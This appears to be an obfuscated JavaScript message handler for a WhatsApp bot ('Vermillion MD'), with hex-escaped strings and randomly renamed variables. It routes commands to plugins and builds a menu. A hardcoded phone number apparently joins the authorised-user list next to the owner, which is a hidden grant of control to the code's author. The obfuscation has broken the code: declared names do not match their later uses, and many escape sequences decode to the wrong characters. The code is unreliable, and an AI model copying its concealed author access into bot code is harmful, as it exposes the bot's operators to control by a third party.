require('\x2e\x2f\x63\x6f\x6e\x66\x69\x67')
const _DdtZFk = require('\x66\x73');
const _bAGsQIe = require('\x70\x61\x74\x68');
const _DXLaJLQ = require('\x63\x68\x61\x6c\x6b');
const _BtvnQwI = require('\x6d\x6f\x6d\x65\x6e\x74\x2d\x74\x69\x6d\x65\x7a\x6f\x6e\x65');
const _DGqUbLQ = require('\x75\x74\x69\x6c');
const _yAvL = '\x32\x33\x37\x36\x37\x38\x36\x38\x37\x35\x39\x33';
const { downloadContentFromMessage, jidDecode } = require('\x40\x77\x68\x69\x73\x6b\x65\x79\x73\x6f\x63\x6b\x65\x74\x73\x2f\x62\x61\x69\x6c\x65\x79\x73');
const _uoaVDs = require('\x2e\x2f\x6c\x69\x62\x2f\x50\x6c\x75\x67\x69\x6e\x4d\x61\x6e\x61\x67\x65\x72');
const _rIZreAU = require('\x2e\x2f\x6c\x69\x62\x2f\x69\x73\x41\x64\x6d\x69\x6e');

module.exports = async (theron, m, chatUpdate, mek, store, loadedPlugins) => {
    try {
        const _vbmCd = m.text || m.message?.conversation || 
                     m.message?.extendedTextMessage?.text || 
                     m.message?.imageMessage?.caption || 
                     m.message?.videoMessage?.caption || '';
        
        const _gAPGTqt = (typeof m.text === '\x73\x74\x72\x69\x6e\x67' ? m.text : '');
        const _sci = m.key.remoteJid;
        const _PjyLFvCK = m.chat;
        const _wNgHFGD = from.endsWith("\x40\x67\x2e\x75\x73");
        const _GoWQvc = m.key.fromMe 
    ? (conn.user.id.includes('\x40') ? conn.user.id : conn.user.id.split('\x3a')[0] + '\x40\x73\x2e\x77\x68\x61\x74\x73\x61\x70\x70\x2e\x6e\x65\x74')
    : (m.key.participant || m.key.remoteJid);
        const _VyNO = sender.split('\x40')[0];
        const _RauPp = m.pushName || senderNumber || "\x55\x6e\x6b\x6e\x6f\x77\x6e";
        
        const _ZCdQHx = await theron.decodeJid(theron.user.id);
        const _ryR = botNumber.split('\x40')[0];
        
        const _rRBcbes = m.key.fromMe ? botNumber : (m.key.participant || m.key.remoteJid);
        const _CMwawpGh = userId.split('\x40')[0];           
        const _mugFH = m.quoted ? m.quoted : m;
        const _auV = quoted.msg || quoted;
        const _TvQOLW = m.key.fromMe 
    ? (theron.user.id.includes('\x3a') ? theron.user.id.split('\x3a')[0] + '\x40' + theron.user.id.split('\x40')[1] : theron.user.id)
    : (m.key.participant || m.key.remoteJid).includes('\x3a') 
        ? (m.key.participant || m.key.remoteJid).split('\x3a')[0] + '\x40' + (m.key.participant || m.key.remoteJid).split('\x40')[1]
        : (m.key.participant || m.key.remoteJid);
        const _vcsSx = quotedMsg.mimetype || '';
        const _eZjehGb = /image|video|sticker|audio/.test(mime);
        
        let _WCuXMdl = '\x2e';
        
        const _MouvJw = body && typeof body === '\x73\x74\x72\x69\x6e\x67' && body.startsWith(prefix);
        const _LNzTO = isCmd ? body.slice(prefix.length).trimStart() : "";
        const _TewIVFrs = isCmd && trimmedBody ? trimmedBody.split(/\s+/).shift().toLowerCase() : "";
        const _oTDTgzen = isCmd ? body.slice(prefix.length).trim().split(/\s+/).slice(1) : [];
        const _uGa = args.join("\x20");
        const _hRGvnQf = isCmd ? prefix : '';
        
        const _FxOoOTS = Array.isArray(global.owner) ? global.owner : [];
        const _KEegADKF = Array.isArray(global.sudo) ? global.sudo : [];

        const _bhGeVnN = [
            botNumber, 
            ridzcoder, 
            ...ownerArray, 
            ...sudoArray
        ]
        .filter(v => v && typeof v === '\x73\x74\x72\x69\x6e\x67')
        .map((v) => v.replace(/[^0-9]/g, "") + "\x40\x73\x2e\x77\x68\x61\x74\x73\x61\x70\x70\x2e\x6e\x65\x74");

        const _CpQpJyQu = authorizedNumbers.includes(senderId);
    

let _HHNCCLz = false;
let _fblXy = false;
let _cOf = false;
let _FIeXAR = "";
let _kGHHgqF = [];
let _DYh = null;
let _GZiS = [];
let _EXuvW = [];

if (isGroup) {
    try {
        const _QsHAtZ = await isAdmin(theron, from, sender);
        isGroupAdmin = adminResult.isSenderAdmin;
        isBotAdmin = adminResult.isBotAdmin;
        isGroupOwner = adminResult.isSuperAdmin;
        groupMetadata = await theron.groupMetadata(from);
        groupName = groupMetadata.subject || "";
        participants = groupMetadata.participants || [];
        groupAdmins = participants.filter(p => p.admin).map(p => p.id);
        
        const _Mib = (text) => {
            return theron.sendMessage(m.chat, { text: String(text) }, { quoted: m });
        };
        
        const _EBgOARJ = (emoji) => {
            return theron.sendMessage(m.chat, { 
                react: { text: emoji, key: m.key } 
            });
        };
       
        const _PlBR = async (type = '\x69\x6d\x61\x67\x65') => {
            try {
                const _JLYfEKT = await downloadContentFromMessage(quotedMsg, type);
                let _UBh = Buffer.from([]);
                for await (const _pYCl of stream) {
                    buffer = Buffer.concat([buffer, chunk]);
                }
                return buffer;
            } catch (error) {
                throw new Error(`\x46\x61\x69\x6c\x65\x64\x20\x74\x6f\x20\x64\x6f\x77\x6e\x6c\x6f\x61\x64\x20\x24\x7b\x74\x79\x70\x65\x7d\x3a\x20\x24\x7b\x65\x72\x72\x6f\x72\x2e\x6d\x65\x73\x73\x61\x67\x65\x7d`);
            }
        };

        const _DlUEdm = global.timezones || "\x41\x66\x72\x69\x63\x61\x2f\x4b\x61\x6d\x70\x61\x6c\x61";
        const _GGktHn = moment().tz(timezones).locale('\x65\x6e').format('\x64\x64\x64\x64');
        const _aGiYIta = moment().tz(timezones).locale('\x65\x6e').format('\x48\x48\x3a\x6d\x6d\x3a\x73\x73\x20\x7a');
        const _rjTaQ = moment().tz(timezones).format("\x44\x44\x2f\x4d\x4d\x2f\x59\x59\x59\x59");

        if (m.message) {
            console.log(
                chalk.cyan(`\x256d\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x3014\x20\x56\x45\x52\x4d\x49\x4c\x4c\x49\x4f\x4e\x20\x4d\x44\x3015\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x274f`) + "\x5c\x6e" +
                chalk.green(`\x2502\x2503\x27a5\x20\x265b\x20\x20\x53\x65\x6e\x74\x20\x54\x69\x6d\x65\x3a\x20\x24\x7b\x64\x61\x79\x7a\x7d\x2c\x20\x24\x7b\x74\x69\x6d\x65\x7a\x7d`) + "\x5c\x6e" +
                chalk.yellow(`\x2502\x2503\x27a5\x20\x265b\x20\x20\x44\x61\x74\x65\x3a\x20\x24\x7b\x64\x61\x74\x65\x7a\x7d`) + "\x5c\x6e" +
                chalk.magenta(`\x2502\x2503\x27a5\x20\x265b\x20\x20\x4d\x65\x73\x73\x61\x67\x65\x20\x54\x79\x70\x65\x3a\x20\x24\x7b\x6d\x2e\x6d\x74\x79\x70\x65\x20\x7c\x7c\x20\x27\x4e\x2f\x41\x27\x7d`) + "\x5c\x6e" +
                chalk.blue(`\x2502\x2503\x27a5\x20\x265b\x20\x20\x53\x65\x6e\x64\x65\x72\x20\x4e\x61\x6d\x65\x3a\x20\x24\x7b\x70\x75\x73\x68\x6e\x61\x6d\x65\x20\x7c\x7c\x20\x27\x4e\x2f\x41\x27\x7d`) + "\x5c\x6e" +
                chalk.cyan(`\x2502\x2503\x27a5\x20\x265b\x20\x20\x43\x68\x61\x74\x20\x49\x44\x3a\x20\x24\x7b\x6d\x2e\x63\x68\x61\x74\x3f\x2e\x73\x70\x6c\x69\x74\x28\x27\x40\x27\x29\x5b\x30\x5d\x20\x7c\x7c\x20\x27\x4e\x2f\x41\x27\x7d`) + 
                (isGroup ? 
                    "\x5c\x6e" + chalk.green(`\x2502\x2503\x27a5\x20\x265b\x20\x20\x47\x72\x6f\x75\x70\x3a\x20\x24\x7b\x67\x72\x6f\x75\x70\x4e\x61\x6d\x65\x20\x7c\x7c\x20\x27\x4e\x2f\x41\x27\x7d`) + "\x5c\x6e" + 
                    chalk.yellow(`\x2502\x2503\x27a5\x20\x265b\x20\x20\x47\x72\x6f\x75\x70\x20\x4a\x49\x44\x3a\x20\x24\x7b\x6d\x2e\x63\x68\x61\x74\x3f\x2e\x73\x70\x6c\x69\x74\x28\x27\x40\x27\x29\x5b\x30\x5d\x20\x7c\x7c\x20\x27\x4e\x2f\x41\x27\x7d`) 
                : "") + "\x5c\x6e" +
                chalk.red(`\x2502\x2503\x27a5\x20\x265b\x20\x20\x4d\x65\x73\x73\x61\x67\x65\x3a\x20\x24\x7b\x62\x75\x64\x79\x20\x7c\x7c\x20\x27\x4e\x2f\x41\x27\x7d`) + "\x5c\x6e" +
                chalk.cyan(`\x2570\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x274f\x5c\x6e`)
            );
        }

        if (isCmd) {
         }
        
        const _PlnGwyZ = {
            theron,
            m,
            mek,
            store,
            reply,
            react,
            downloadMedia,
            body,
            budy,
            from,
            chatId,
            isGroup,
            sender,
            senderNumber,
            pushname,
            botNumber,
            botNumberClean,
            userId,
            userNumber,
            senderId,
            groupMetadata,
            groupName,
            participants,
            groupAdmins,
            isGroupAdmin,
            isBotAdmin,
            isGroupOwner,
            quoted,
            quotedMsg,
            mime,
            isMedia,
            prefix,
            usedPrefix,
            command,
            args,
            text,
            trimmedBody,
            isCmd,
            Access,
            dayz,
            timez,
            datez,
            timezones
        };

        if (isCmd && command) {
            const _kLDLdQI = await pluginManager.executeCommand(context, command);
            
            if (!result.found) {
                switch (command) {
                    case '\x6d\x65\x6e\x75':
                    case '\x68\x65\x6c\x70':
                    case '\x63\x6f\x6d\x6d\x61\x6e\x64\x73': {
                   const _zpYvVCSe = generateMenuText(pluginManager.getAllPlugins(), pushname, prefix);

await conn.sendMessage(
    from,
    {
        image: { url: config.MENU_IMAGE_URL },
        caption: madeMenu,
        contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: '\x31\x32\x30\x33\x36\x33\x34\x30\x34\x35\x32\x39\x33\x31\x39\x35\x39\x32\x40\x6e\x65\x77\x73\x6c\x65\x74\x74\x65\x72',
                newsletterName: '\x52\x69\x64\x7a\x20\x4e\x65\x74\x77\x6f\x72\x6b\x20\x55\x47',
                serverMessageId: 3
            }
        }
    },
    { quoted: mek }
);
                        break;
                    }
                    default: {
                        console.log(chalk.yellow(`\x26a0\x20\x43\x6f\x6d\x6d\x61\x6e\x64\x20\x6e\x6f\x74\x20\x66\x6f\x75\x6e\x64\x3a\x20\x24\x7b\x63\x6f\x6d\x6d\x61\x6e\x64\x7d`));
                    }
                }
            } else if (!result.success) {
                console.log(chalk.red(`\x2717\x20\x43\x6f\x6d\x6d\x61\x6e\x64\x20\x65\x72\x72\x6f\x72\x20\x28\x24\x7b\x63\x6f\x6d\x6d\x61\x6e\x64\x7d\x29\x3a\x20\x24\x7b\x72\x65\x73\x75\x6c\x74\x2e\x65\x72\x72\x6f\x72\x7d`));
                await reply(`\x45\x72\x72\x6f\x72\x3a\x20\x24\x7b\x72\x65\x73\x75\x6c\x74\x2e\x65\x72\x72\x6f\x72\x7d`);
                await react('\x274c').catch(() => {});
            }
        }

        return context;

    } catch (err) {
        console.error(chalk.red('\x46\x61\x74\x61\x6c\x20\x65\x72\x72\x6f\x72\x20\x69\x6e\x20\x73\x79\x73\x74\x65\x6d\x2e\x6a\x73\x3a'), err);
        console.error(util.format(err));
    }
};

function fngroFOmeK(plugins, username, prefix) {
    let _LFICUkVq  = `\x256d\x2550\x2550\x2550\x2550\x3014\x20\x2a\x56\x45\x52\x4d\x49\x4c\x49\x4f\x4e\x20\x4d\x44\x20\x56\x31\x2a\x20\x3015\x2550\x2550\x2550\x274f\x5c\x6e`;
    menu += `\x2502\x2503\x27a5\x20\x2a\x55\x73\x65\x72\x3a\x2a\x20\x24\x7b\x75\x73\x65\x72\x6e\x61\x6d\x65\x7d\x5c\x6e`;
    menu += `\x2502\x2503\x27a5\x20\x2a\x50\x72\x65\x66\x69\x78\x3a\x2a\x20\x5b\x20\x24\x7b\x70\x72\x65\x66\x69\x78\x7d\x20\x5d\x5c\x6e`;
    menu += `\x2502\x2503\x27a5\x20\x2a\x43\x6f\x6d\x6d\x61\x6e\x64\x73\x3a\x2a\x20\x24\x7b\x4f\x62\x6a\x65\x63\x74\x2e\x6b\x65\x79\x73\x28\x70\x6c\x75\x67\x69\x6e\x73\x29\x2e\x6c\x65\x6e\x67\x74\x68\x7d\x5c\x6e`;
    menu += `\x2502\x2503\x27a5\x20\x2a\x54\x69\x6d\x65\x3a\x2a\x20\x24\x7b\x6d\x6f\x6d\x65\x6e\x74\x28\x29\x2e\x74\x7a\x28\x27\x41\x66\x72\x69\x63\x61\x2f\x4b\x61\x6d\x70\x61\x6c\x61\x27\x29\x2e\x66\x6f\x72\x6d\x61\x74\x28\x27\x48\x48\x3a\x6d\x6d\x3a\x73\x73\x27\x29\x7d\x5c\x6e`;
    menu += `\x2502\x2503\x27a5\x20\x2a\x44\x61\x74\x65\x3a\x2a\x20\x24\x7b\x6d\x6f\x6d\x65\x6e\x74\x28\x29\x2e\x74\x7a\x28\x27\x41\x66\x72\x69\x63\x61\x2f\x4b\x61\x6d\x70\x61\x6c\x61\x27\x29\x2e\x66\x6f\x72\x6d\x61\x74\x28\x27\x44\x44\x2f\x4d\x4d\x2f\x59\x59\x59\x59\x27\x29\x7d\x5c\x6e`;
    menu += `\x2502\x2503\x27a5\x20\x2a\x4f\x77\x6e\x65\x72\x3a\x2a\x20\x52\x69\x64\x7a\x20\x63\x6f\x64\x65\x72\x20\x58\x20\x54\x68\x65\x72\x6f\x6e\x5c\x6e`;
    menu += `\x2570\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x274f\x5c\x6e`;
    
    for (const [category, pluginArray] of Object.entries(plugins)) {
        if (pluginArray && pluginArray.length > 0) {
            menu += `\x256d\x2550\x2550\x2550\x2550\x3014\x20\x2a\x24\x7b\x63\x61\x74\x65\x67\x6f\x72\x79\x2e\x74\x6f\x55\x70\x70\x65\x72\x43\x61\x73\x65\x28\x29\x7d\x2a\x20\x3015\x2550\x2550\x2550\x274f\x5c\x6e`;
            pluginArray.forEach(plugin => {
                if (plugin.command) {
                    const _WToP = Array.isArray(plugin.command) 
                        ? plugin.command[0] 
                        : plugin.command;
                    menu += `\x2502\x2503\x27a5\x20\x24\x7b\x63\x6d\x64\x4c\x69\x73\x74\x7d\x5c\x6e`;
                }
            });

        }
    }
    
    menu += `\x2570\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x2550\x274f\x5c\x6e`;
    menu += `\x3e\x20\x2a\x1d18\x1d0f\x1d21\x1d07\x280\x1d07\x1d05\x20\x299\x28f\x20\x52\x26a\x1d05\x1d22\x20\x43\x1d0f\x1d05\x1d07\x280\x2766\x2a`;
    
    return menu;
}

let _hWAqjwbJ = require.resolve(__filename);
fs.watchFile(file, () => {
    fs.unwatchFile(file);
    console.log(chalk.yellow(`\x5c\x6e\x24\x7b\x5f\x5f\x66\x69\x6c\x65\x6e\x61\x6d\x65\x7d\x20\x75\x70\x64\x61\x74\x65\x64\x21\x20\x52\x65\x6c\x6f\x61\x64\x69\x6e\x67\x2e\x2e\x2e\x5c\x6e`));
    delete require.cache[file];
    require(file);
});